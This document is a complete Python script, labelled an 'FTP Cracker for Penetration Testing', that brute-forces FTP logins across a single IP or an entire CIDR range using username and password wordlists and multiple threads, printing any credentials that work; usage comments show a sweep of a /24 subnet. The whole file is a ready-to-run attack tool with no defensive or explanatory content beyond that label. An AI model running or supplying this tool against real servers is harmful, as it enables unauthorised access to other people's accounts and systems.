import ftplib
import argparse
import threading
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed

def try_login(ip, username, password):
    try:
        with ftplib.FTP(ip, timeout=5) as ftp:
            ftp.login(username, password)
            return (ip, username, password)
    except ftplib.error_perm:
        return None
    except Exception as e:
        print(f"Error connecting to {ip}: {str(e)}")
        return None

def crack_ftp(ip, usernames, passwords, max_threads=10):
    successful_logins = []
    total_attempts = len(usernames) * len(passwords)
    attempts = 0

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        future_to_creds = {executor.submit(try_login, ip, u, p): (u, p) for u in usernames for p in passwords}
        for future in as_completed(future_to_creds):
            attempts += 1
            result = future.result()
            if result:
                successful_logins.append(result)
                print(f"\nSuccess! IP: {result[0]}, Username: {result[1]}, Password: {result[2]}")
            print(f"\rProgress: {attempts}/{total_attempts} ({attempts/total_attempts*100:.2f}%)", end="", flush=True)

    return successful_logins

def load_wordlist(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def main():
    parser = argparse.ArgumentParser(description="FTP Cracker for Penetration Testing")
    parser.add_argument("-t", "--target", required=True, help="Target IP address or range (CIDR notation)")
    parser.add_argument("-u", "--userlist", required=True, help="Path to username wordlist")
    parser.add_argument("-p", "--passlist", required=True, help="Path to password wordlist")
    parser.add_argument("-m", "--max-threads", type=int, default=10, help="Maximum number of threads (default: 10)")
    args = parser.parse_args()

    try:
        targets = list(ipaddress.ip_network(args.target).hosts())
    except ValueError:
        print("Invalid IP address or range. Please use a single IP or CIDR notation.")
        return

    usernames = load_wordlist(args.userlist)
    passwords = load_wordlist(args.passlist)

    print(f"Loaded {len(usernames)} usernames and {len(passwords)} passwords.")
    print(f"Targeting {len(targets)} IP address(es).")

    all_successful_logins = []

    for ip in targets:
        print(f"\nAttempting to crack FTP on {ip}")
        successful_logins = crack_ftp(str(ip), usernames, passwords, args.max_threads)
        all_successful_logins.extend(successful_logins)

    print("\n--- Results ---")
    if all_successful_logins:
        for login in all_successful_logins:
            print(f"Successful login - IP: {login[0]}, Username: {login[1]}, Password: {login[2]}")
    else:
        print("No successful logins found.")

if __name__ == "__main__":
    main()
##usage##########################
####python ftpcracker.py -t TARGET -u USERLIST -p PASSLIST [-m MAX_THREADS]
#######- -t, --target: Target IP or range (e.g., 192.168.1.1 or 192.168.1.0/24)
##- -u, --userlist: Path to username wordlist file
##- -p, --passlist: Path to password wordlist file
##- -m, --max-threads: Maximum number of threads (default: 10)
##python ftpcracker.py -t 192.168.1.0/24 -u users.txt -p passwords.txt -m 20
